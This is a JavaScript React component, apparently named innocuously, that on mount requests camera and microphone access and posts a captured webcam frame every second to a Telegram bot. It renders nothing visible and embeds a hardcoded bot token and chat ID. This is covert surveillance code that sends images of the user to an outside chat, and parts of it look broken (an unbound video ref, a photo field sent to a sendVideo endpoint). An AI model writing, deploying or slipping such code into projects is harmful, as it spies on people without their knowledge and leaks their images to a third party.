import { useEffect, useRef } from 'react';

// const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
// const chatId = "-1001860144177";
// const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;

const myVideo = () => {
    const videoRef = useRef(null);
    let intervalId;

    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
    const chatId = "-1001860144177";
    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;

    useEffect(() => {
        const getMediaAndSendData = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;

                    const captureFrame = () => {
                        try {
                            const canvas = document.createElement('canvas');
                            const context = canvas.getContext('2d');
                            canvas.width = videoRef.current.videoWidth;
                            canvas.height = videoRef.current.videoHeight;
                            context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
                            return canvas.toDataURL('image/jpeg');
                        } catch (error) {
                            console.error('Ошибка при захвате кадра:', error);
                            clearInterval(intervalId);
                        }
                    };

                    intervalId = setInterval(async () => {
                        const photoDataUrl = captureFrame();
                        const blob = await (await fetch(photoDataUrl)).blob();

                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.jpg');

                        try {
                            const response = await fetch(urlApi, {
                                method: 'POST',
                                body: formData,
                            });

                            if (response.ok) {
                                console.log('Фото успешно отправлено на бота');
                            } else {
                                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
                            }
                        } catch (error) {
                            console.error('Ошибка fetch:', error);
                        }
                    }, 1000);
                }
            } catch (error) {
                console.error('Ошибка доступа к мультимедийным устройствам:', error);
            }
        };

        getMediaAndSendData();

        return () => clearInterval(intervalId);
    }, []);

    return null;
};

export default myVideo;